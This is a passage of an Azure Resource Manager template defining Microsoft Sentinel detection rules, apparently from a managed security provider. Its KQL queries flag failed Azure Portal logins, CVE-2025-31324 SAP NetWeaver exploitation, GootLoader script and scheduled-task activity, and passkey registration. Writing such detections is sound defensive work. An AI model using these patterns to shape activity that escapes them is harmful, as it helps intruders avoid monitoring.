ExcludeAccount\n| extend Tags = 'tag: RBA'\n| extend bv_act_type = iff(bv_vendor_action has 'application', 'Application', 'SPN') \n| invoke match(exclusions, 'exclusion')\n| extend excluded = iff((alert_type in ('SOC','CUSTOM') and match_status == 'exclusion') or (alert_type == 'RBA' and visibility contains '0'), true, false)\n| where excluded == false\n| extend alert_id_temp = alert_id\n| lookup bv_desc_temp on alert_id_temp\n| invoke desc_gen('long_template')\n| invoke desc_gen('short_template')\n| invoke gen_detail_and_hash(excluded_description_fields, 300, 5,efd=excluded_dedup_fields,dh=calculate_hash)\n| where iff(exclude_hash, (BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash), true)\n| extend \n    bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)   \n    , bv_desc_l = strcat(desc_gen['long_template'],'\\n\\n',ExtendedDescription)\n    , bv_desc_s =desc_gen['short_template']      \n| extend bv_alert_name =  strcat('BV-006: [RBA] Azure AD - ', bv_desc_s)  \n       , bv_alarm_attacker_entities = array_concat(pack_array(bv_user), pack_array(bv_src_ip))\n| extend bv_rule_version = '1.0.5379'\n| extend bv_rule_timestamp = '1719423385.406157'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.5379 bv_rule_timestamp: 1719423385.406157'\n| project-keep bv_*\n      , Tags",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact",
            "ResourceDevelopment"
          ],
          "techniques": [
            "T1496",
            "T1585"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account",
                "IP"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "{{bv_alert_name}}",
            "alertDescriptionFormat": "{{bv_desc_l}}\n\nCategory: Azure AD\nMITRE: T1496 MITRE: T1585\n{{Tags}}     \n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-037')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-037')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-037: [RBA] Azure AD - Failed Logins to Azure Portal",
          "description": "Access attempts to Azure Portal from an unauthorized user. Either invalid password or the user account does not exist. More than 5 fails in one hour. MITRE: T1110 Category: Entra ID tag: RBA",
          "severity": "Informational",
          "enabled": true,
          "query": "let generated_lookback = 1h;\nSigninLogs\n| where TimeGenerated between (ago(generated_lookback)..now())\n| extend OS = tostring(DeviceDetail.operatingSystem), Browser = tostring(DeviceDetail.browser)\n| extend StatusCode = tostring(Status.errorCode), StatusDetails = tostring(Status.additionalDetails)\n| extend State = tostring(LocationDetails.state), City = tostring(LocationDetails.city)\n| where  AppDisplayName contains 'Azure Portal'\n| where ResultType in ( '50126' , '50020')\n| parse UserPrincipalName with UserName '@' UserUPNSuffix\n| extend MonitoredAccount = iff(UserName in~ (A037_MONITORED_ACCOUNT), true, false)\n| extend Class = 'RBA'\n, Tags = 'tag: RBA'\n| summarize FailedConnections=count(), First=max(TimeGenerated),Last=max(TimeGenerated) by UserName, UserDisplayName, AccountCustomEntity = UserPrincipalName, UserUPNSuffix, IPCustomEntity = IPAddress, OS, Browser, City, AppDisplayName, ResultType, ResultDescription, StatusCode, StatusDetails, Location, State, Class, Tags\n| where FailedConnections >= 5\n| sort by FailedConnections desc\n| extend AlertName = strcat('BV-037: [', Class, '] Azure AD - Failed Logins to Azure Portal')\n| extend bv_rule_version = '1.1.5193'\n| extend bv_rule_timestamp = '1713454026.159127'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5193 bv_rule_timestamp: 1713454026.159127'\n| project\n    UserName,\n    UserDisplayName,\n    AccountCustomEntity,\n    UserUPNSuffix,\n    IPCustomEntity,\n    OS,\n    Browser,\n    City,\n    AppDisplayName,\n    ResultType,\n    ResultDescription,\n    StatusCode,\n    StatusDetails,\n    Location,\n    State,\n    Class,\n    Tags,\n    AlertName,\n    bv_rule_combined_string",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "{{AlertName}}",
            "alertDescriptionFormat": "Access attempts to Azure Portal from an unauthorized user. Either invalid password or the user account does not exist. More than 5 fails in one hour. MITRE: T1110 Category: Azure AD {{Tags}}\n{{bv_rule_combined_string}}"
          },
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UserUPNSuffix"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-30000')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-30000')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-30000: [SOC] XDR Incident Wrapper",
          "description": "Used to wrap BV- incidents that were merged and renamed and no longer contain BV- in the titles MITRE:  Category: SecurityAlert tag: SOC",
          "severity": "Informational",
          "enabled": true,
          "query": "let start_time = 7m;\nlet latency = 6h;\nlet end_time = now();\nlet start_time_historical=47h;\nlet alert_id = 'BV-30000';\nlet PreviousAlertIds = toscalar(\n  bv_split_security_alert\n  | where TimeGenerated >= ago(start_time_historical)\n  | where AlertName has alert_id\n  | extend OriginalAlertID = tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).IdentifiedAlertID))[0])\n  |summarize make_set(OriginalAlertID)\n);      \nlet AlertDetails = bv_split_security_alert\n|where TimeGenerated >= ago(start_time + latency)\n| where AlertName has_all ('BV-', '[SOC]') and AlertName !has 'BV-10501'\n| where SystemAlertId !in (PreviousAlertIds)\n| summarize AlertSev = make_set(AlertSeverity), Desc=make_set(Description) by SystemAlertId, AlertName;     \nlet RuleIds = toscalar(SentinelHealth\n| where TimeGenerated >= ago(start_time_historical)\n| where SentinelResourceName has 'BV-'\n| extend RuleId = tostring(ExtendedProperties.RuleId)\n| summarize make_set(RuleId));\nlet ClosedIncidents = toscalar(SecurityIncident\n| where TimeGenerated >= ago(start_time_historical)\n| where RelatedAnalyticRuleIds has_any (RuleIds) and array_length(RuleIds) > 0\n| where Status has_any ('Closed', 'Resolved')\n| summarize make_set(IncidentNumber));       \nSecurityIncident\n| where TimeGenerated >= ago(start_time + latency)\n| where RelatedAnalyticRuleIds contains 'BV-' or (RelatedAnalyticRuleIds has_any (RuleIds) and array_length(RuleIds) > 0)\n| where Title !startswith \"BV-\" and IncidentNumber !in (ClosedIncidents)\n| mv-expand SystemAlertId = AlertIds\n| extend SystemAlertId = tostring(SystemAlertId)\n| join kind=inner AlertDetails on SystemAlertId\n| summarize arg_max(LastModifiedTime, *) by IncidentNumber\n| where Status =~ 'New' and Comments !contains \"BlueVoyant SOC\" and Owner !contains \"BVSOC@blueteamglobal.com\" and ClassificationComment !contains \"BlueVoyant has investigated\" and ModifiedBy <> 'Fusion'\n| extend Desc = Desc[0]\n| parse AlertName with BV_RuleName ' - ' *\n| project TimeGenerated, Title, IncidentNumber, IncidentName, IncidentUrl, AlertIds, Status, Comments, Classification, ClassificationComment, BV_RuleID=RelatedAnalyticRuleIds, SystemAlertId, BV_RuleName, AlertName, Severity = AlertSev, Desc",
          "queryFrequency": "PT7M",
          "queryPeriod": "PT47H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-30000: [SOC] BV XDR Incident {{SystemAlertId}}|{{IncidentName}}",
            "alertDescriptionFormat": "{{Desc}}"
          },
          "customDetails": {
            "IdentifiedAlertID": "SystemAlertId"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11515')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11515')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11515: [SOC] Defender - CVE-2025-31324 SAP NetWeaver Exploit",
          "description": "This alert is designed to detect potentially malicious activity related to the use of SAP NetWeaver Exploit detailed in CVE-2025-31324. MITRE: T1190,T1505,T1059,T1620,T1055,T1622 Category: DefenderXDR/Microsoft Defender XDR tag: SOC",
          "severity": "Medium",
          "enabled": true,
          "query": "let alert_id = 'BV-11515';\nlet alert_type = 'SOC';\nlet exclude_hash = true;\nlet calculate_hash = false;\nlet max_description_line = 300;\nlet max_description_list_length = 5;\nlet end_time = now();\nlet start_time = 10m;\nlet start_time_historical = 1h;\nlet start_time_suppress = 1d;\nlet global_config = dynamic({\n    'EXCLUSION': dynamic([{}])\n    , 'RBASCORE': 0\n    , 'excluded_dedup_hash_fields': dynamic(['bv_alert_category', 'bv_scheduledtask'])      \n});\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11515_CONFIG['EXCLUSION'], dynamic([{}]));\nlet excluded_description_fields = dynamic(['bv_raw', 'bv_dest_user_type','bv_change_action','bv_vendor_product', 'bv_vendor_reason', 'bv_alarm_rba_score']);\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_src_ip']));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11515_CONFIG['RBASCORE']),real(1.0));\nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet calc_dedup_hash = (table_parameter: (*), excluded_fields:dynamic=dynamic([])){  \n    table_parameter  \n    //| extend excluded_fields = array_concat(bv_excluded_dedup_hash_fields,excluded_fields)   \n    | extend all_data = pack_all(ignore_null = true)  \n    | extend keys = array_sort_asc(bag_keys(all_data))  \n    | mv-apply k = keys to typeof(string) on (    \n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))  \n        | extend \n            is_valid_field = k startswith 'bv_' and not(k has_any (excluded_fields))\n            , is_valid_value = (gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1 and isnotempty(array_sort_desc(dynamic_entity)[0])) or (gettype(dynamic_entity) != 'array' and dynamic_entity != 'array')\n        | extend \n            bv_dedup_fields = iff(is_valid_field and is_valid_value, k, '')  \n            , bv_dedup_values = iff(is_valid_field and is_valid_value, coalesce(tostring(dynamic_entity[0]),dynamic_entity), '') \n        | summarize bv_dedup_fields = make_set_if(tostring(bv_dedup_fields), isnotempty(bv_dedup_fields)), dedup_values = make_set_if(tostring(bv_dedup_values), isnotempty(bv_dedup_values)) \n    )  \n    | extend bv_dedup_hash = hash_sha1(strcat_array(dedup_values,''))  \n};        \nDeviceFileEvents\n| where TimeGenerated > ago(start_time) and TimeGenerated < end_time  \n| where ActionType == 'FileCreated'\n| where FolderPath has_any ('j2ee/cluster/apps/sap.com/irj/servletjsp/irj/', '\\\\j2ee\\\\cluster\\\\apps\\\\sap.com\\\\irj\\\\')          \n| summarize\n      bv_event_count = count(),\n      bv_file_name = make_set(FileName, 10),\n      bv_start_time = min(TimeGenerated),\n      bv_end_time = max(TimeGenerated),\n      bv_user = make_set(InitiatingProcessAccountName, 10),\n      bv_src_dvc = make_set(DeviceName, 10),\n      bv_parent_process_command_line = make_set(InitiatingProcessCommandLine, 10),\n      bv_folder_path = make_set(FolderPath, 10)\n    by bv_src_dvc_id = DeviceId          \n| invoke match(exclusions, 'exclusion')\n| where match_status != 'exclusion'\n| invoke description(excluded_description_fields, 300, 5)\n| extend bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)\n| invoke calc_dedup_hash(excluded_dedup_fields)\n| where BV_FUN_DEDUP(alert_id,ago(start_time_suppress)) !has bv_dedup_hash              \n| extend \n    bv_alarm_attacker_entities = array_concat(pack_array(bv_src_dvc_id), bv_user)          \n    , bv_mapping_tag = bv_src_dvc_id\n    , bv_user1 = bv_user[0]\n    , bv_src_dvc1 = bv_src_dvc[0]\n| project-keep bv_*, ExtendedDescription",
          "queryFrequency": "PT10M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Persistence",
            "PrivilegeEscalation",
            "Execution",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1190",
            "T1505",
            "T1059",
            "T1620",
            "T1055",
            "T1622"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11515: [SOC] Defender - CVE-2025-31324 SAP NetWeaver Exploit on host {{bv_src_dvc_id}}",
            "alertDescriptionFormat": "This alert is designed to detect potentially malicious activity related to the use of SAP NetWeaver Exploit detailed in CVE-2025-31324.\n\n{{ExtendedDescription}}\n\ntag: SOC\nMITRE: T1190 MITRE: T1505 MITRE: T1059 MITRE: T1620 MITRE: T1055 MITRE: T1622"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "bvtag": "bv_mapping_tag",
            "AttackerEntity": "bv_alarm_attacker_entities"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_user1"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc1"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11510')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11510')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11510: [SOC] Defender - GootLoader Malware Actvity",
          "description": "This alert is designed to detect potentially malicious activity related to GootLoader malware.\nThe malware continues to evolve, using SEO poisoning to distribute malicious JavaScript files disguised as legal documents through compromised WordPress sites. As documented by DFIR Report, once executed, the malware establishes persistence, conducts reconnaissance, and deploys additional payloads including Cobalt Strike, ultimately progressing to domain controller compromise and potential ransomware deployment within hours of initial infection. MITRE: T1608,T1189,T1059,T1053,T1569,T1204,T1047 Category: DefenderXDR/Microsoft Defender XDR tag: SOC",
          "severity": "Medium",
          "enabled": true,
          "query": "let alert_id = 'BV-11510';\nlet alert_type = 'SOC';\nlet exclude_hash = true;\nlet calculate_hash = false;\nlet max_description_line = 300;\nlet max_description_list_length = 5;\nlet end_time = now();\nlet start_time = 10m;\nlet start_time_historical = 1h;\nlet start_time_suppress = 47h;\nlet global_config = dynamic({\n    'EXCLUSION': dynamic([{}])\n    , 'RBASCORE': 0\n    , 'excluded_dedup_hash_fields': dynamic(['bv_alert_category', 'bv_scheduledtask'])      \n});\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11510_CONFIG['EXCLUSION'], dynamic([{}]));\nlet excluded_description_fields = dynamic(['bv_raw', 'bv_dest_user_type','bv_change_action','bv_vendor_product', 'bv_vendor_reason', 'bv_alarm_rba_score']);\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_src_ip']));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11510_CONFIG['RBASCORE']),real(1.0));\nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet calc_dedup_hash = (table_parameter: (*), excluded_fields:dynamic=dynamic([])){  \n    table_parameter  \n    //| extend excluded_fields = array_concat(bv_excluded_dedup_hash_fields,excluded_fields)   \n    | extend all_data = pack_all(ignore_null = true)  \n    | extend keys = array_sort_asc(bag_keys(all_data))  \n    | mv-apply k = keys to typeof(string) on (    \n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))  \n        | extend \n            is_valid_field = k startswith 'bv_' and not(k has_any (excluded_fields))\n            , is_valid_value = (gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1 and isnotempty(array_sort_desc(dynamic_entity)[0])) or (gettype(dynamic_entity) != 'array' and dynamic_entity != 'array')\n        | extend \n            bv_dedup_fields = iff(is_valid_field and is_valid_value, k, '')  \n            , bv_dedup_values = iff(is_valid_field and is_valid_value, coalesce(tostring(dynamic_entity[0]),dynamic_entity), '') \n        | summarize bv_dedup_fields = make_set_if(tostring(bv_dedup_fields), isnotempty(bv_dedup_fields)), dedup_values = make_set_if(tostring(bv_dedup_values), isnotempty(bv_dedup_values)) \n    )  \n    | extend bv_dedup_hash = hash_sha1(strcat_array(dedup_values,''))  \n};        \nlet fileEvents = DeviceFileEvents\n    | where TimeGenerated > ago(start_time_historical) and TimeGenerated < end_time  \n    | where ActionType == 'FileCreated'\n    | where (tolower(FileOriginReferrerUrl) matches regex @'\\\\downloads\\\\' and tolower(FolderPath) matches regex @'\\\\appdata\\\\' and FileName endswith '.js') or (InitiatingProcessFileName == 'wscript.exe' and InitiatingProcessCommandLine has_all ('.zip', '.js') and tolower(FolderPath) matches regex @'\\\\appdata\\\\')\n| project FileEventTimestamp = TimeGenerated, DeviceName, DeviceId, InitiatingProcessCommandLine, FileName, FolderPath, FileOriginReferrerUrl;\nlet scheduledtaskEvents = DeviceEvents\n    | where TimeGenerated > ago(start_time_historical) and TimeGenerated < end_time  \n    | where InitiatingProcessCommandLine has_all ('.zip', '.js')\n    | extend Description = tostring(parse_json(AdditionalFields).Description)\n    | where (ActionType == 'OtherAlertRelatedActivity' and AdditionalFields has 'created the scheduled task')\n    | project TaskEventTimestamp = TimeGenerated, DeviceName, DeviceId, ScheduledTaskCommandLine = InitiatingProcessCommandLine, ScheduledTaskDescription = Description, AccountName, InitiatingProcessAccountName;\n    fileEvents\n| join kind=inner (scheduledtaskEvents) on DeviceId\n| summarize\n      bv_event_count = count(),\n      bv_file_name = make_set(FileName, 10),\n      bv_scheduledtask_description = make_set(ScheduledTaskDescription, 10),\n      bv_scheduledtask_command_line = make_set(ScheduledTaskCommandLine, 10),\n      bv_file_time = take_any(FileEventTimestamp),\n      bv_scheduledtask_time = take_any(TaskEventTimestamp),\n      bv_user = make_set(coalesce(AccountName, InitiatingProcessAccountName), 10),\n      bv_src_dvc = make_set(DeviceName, 10),\n      bv_parent_process_command_line = make_set(InitiatingProcessCommandLine, 10)\n    by bv_src_dvc_id = DeviceId          \n| invoke match(exclusions, 'exclusion')\n| where match_status != 'exclusion'\n| invoke description(excluded_description_fields, 300, 5)\n| extend bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)\n| invoke calc_dedup_hash(excluded_dedup_fields)\n| where BV_FUN_DEDUP(alert_id,ago(start_time_suppress)) !has bv_dedup_hash              \n| extend \n    bv_alarm_attacker_entities = array_concat(pack_array(bv_src_dvc_id), bv_user)          \n    , bv_mapping_tag = bv_src_dvc_id\n    , bv_user1 = bv_user[0]\n    , bv_src_dvc1 = bv_src_dvc[0]\n| project-keep bv_*, ExtendedDescription",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT47H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Persistence",
            "PrivilegeEscalation",
            "Execution",
            "ResourceDevelopment"
          ],
          "techniques": [
            "T1608",
            "T1189",
            "T1059",
            "T1053",
            "T1569",
            "T1204",
            "T1047"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11510: [SOC] Defender - GootLoader Malware Actvity on host {{bv_src_dvc_id}}",
            "alertDescriptionFormat": "This alert is designed to detect potentially malicious activity related to GootLoader malware.\n\n{{ExtendedDescription}}\n\ntag: SOC\nMITRE: T1608 MITRE: T1189 MITRE: T1059 MITRE: T1053 MITRE: T1569 MITRE: T1204 MITRE: T1047"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "bvtag": "bv_mapping_tag",
            "AttackerEntity": "bv_alarm_attacker_entities"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_user1"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc1"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-21095')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-21095')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-21095: [RBA] Change - AuditLogs - Passkey Operation",
          "description": "Detecting when unusual hardware passkeys (like a random Feitian device) are suddenly registered in an environment that exclusively uses Microsoft Authenticator passkeys, potentially indicating unauthorized access\n\ncim_models: change MITRE: T1098 Category: BVIM,Entra ID tag: RBA",
          "severity": "Medium",
          "enabled": true,
